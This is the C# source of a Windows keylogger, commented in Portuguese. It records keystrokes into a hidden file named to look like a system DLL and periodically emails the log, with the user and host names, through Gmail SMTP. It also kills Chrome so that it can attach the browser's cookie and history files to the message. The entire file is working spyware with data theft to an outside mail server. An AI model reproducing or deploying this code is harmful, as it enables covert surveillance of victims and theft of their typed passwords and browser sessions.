using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Reflection.Metadata;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Intrinsics.X86;
using System.Threading;
using System.Xml.Linq;


namespace excluir
{

    internal class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static long numberOfKeystrokes = 0;


        static void Main(string[] args)
        {

           



            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments);


            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);



            }

            String path = (filepath + @"\WinConfigs.dll");//nome do arquivo com as informações


            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                }
            }

            //ocultar arquivo
            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);








            bool[] keyPressed = new bool[255];
            while (true)
            {




                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);


                    if (keyState != 0 && !keyPressed[i])
                    {

                        using (StreamWriter sw = File.AppendText(path))
                        {


                            if ((GetAsyncKeyState(0xA0) & 0x8000) == 0 && (GetAsyncKeyState(0xA1) & 0x8000) == 0)
                            {


                                if (i >= 65 && i <= 90)
                                {
                                    Console.Write((Char)(i + 32) + ", ");


                                    sw.Write((char)(i + 32));

                                }
                                else
                                {
                                    Console.Write((Char)(i) + ", ");

                                    sw.Write((char)(i));

                                }



                            }

                            else
                            {
                                //Verificar caracteres especiais  :3
                                switch (i)
                                {
                                    case 48:

                                        Console.Write((Char)(41) + ", ");
                                        sw.Write((char)(41));
                                        break;


                                    case 49:

                                        Console.Write((Char)(33) + ", ");
                                        sw.Write((char)(33));
                                        break;


                                    case 50:

                                        Console.Write((Char)(64) + ", ");
                                        sw.Write((char)(64));
                                        break;


                                    case 51:

                                        Console.Write((Char)(35) + ", ");
                                        sw.Write((char)(35));
                                        break;


                                    case 52:

                                        Console.Write((Char)(36) + ", ");
                                        sw.Write((char)(36));
                                        break;


                                    case 53:

                                        Console.Write((Char)(37) + ", ");
                                        sw.Write((char)(37));
                                        break;


                                    case 54:

                                        Console.Write((Char)(34) + ", ");
                                        sw.Write((char)(34));
                                        break;


                                    case 55:

                                        Console.Write((Char)(38) + ", ");
                                        sw.Write((char)(38));
                                        break;


                                    case 56:

                                        Console.Write((Char)(42) + ", ");
                                        sw.Write((char)(42));
                                        break;


                                    case 57:

                                        Console.Write((Char)(40) + ", ");
                                        sw.Write((char)(40));
                                        break;

                            


                                    default:
                                        Console.Write((Char)(i) + ", ");
                                        sw.Write((char)(i));
                                        break;
                                }




                            }
                        }//using
                        numberOfKeystrokes++;
                        //frequencia a ser enviado os dados ao email :)
                        if (numberOfKeystrokes % 500 == 0)
                        {
                            SendNewMessage();
                        }

                        keyPressed[i] = true;
                    }
                    else if (keyState == 0)
                    {
                        keyPressed[i] = false;
                    }
                }

            }



            


        }//main

        static void SendNewMessage()
        {

            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments);
            String filePath = folderName + @"\WinConfigs.dll";
            String emailbody = "";


            String logContents = File.ReadAllText(filePath);


            DateTime now = DateTime.Now;
            String subject = "Mensagem do keylogger";
            string host = Dns.GetHostName();


           




            emailbody += "\r\n User: " + Environment.UserDomainName + "\\ " + Environment.UserName;
            emailbody += "\r\nhost " + host;
            emailbody += "\r\ntime " + now.ToString();
            emailbody += "\r\n" + logContents;


            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

            //enviar email
            try
            {

                mail.From = new MailAddress("SeuEmail"); //**************************
                mail.To.Add("SeuEmail");//*******************************
                mail.Subject = "Keylogger";
                mail.Body = emailbody;

                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("Email", "Senha");//************************
                SmtpServer.EnableSsl = true;

                

                SmtpServer.Send(mail);


            }
            catch (Exception ex)
            {
               //Console.WriteLine(ex.ToString());
            }




            var process = Process.GetProcesses();
            foreach (Process item in process)
            {
                if (item.ProcessName.ToUpper().Contains("CHROME"))
                {
                    item.Kill();
                }

            }

            Thread.Sleep(1000); 
                //capturar cookies/historico chrome HIHI :D
                System.Net.Mail.Attachment attachment;
            String cookie = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            attachment = new System.Net.Mail.Attachment(cookie +@"\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies");
            attachment = new System.Net.Mail.Attachment(cookie + @"\AppData\Local\Google\Chrome\User Data\Default\History");


            mail.Attachments.Add(attachment);
            









            SmtpServer.Send(mail);





        }

    }
}
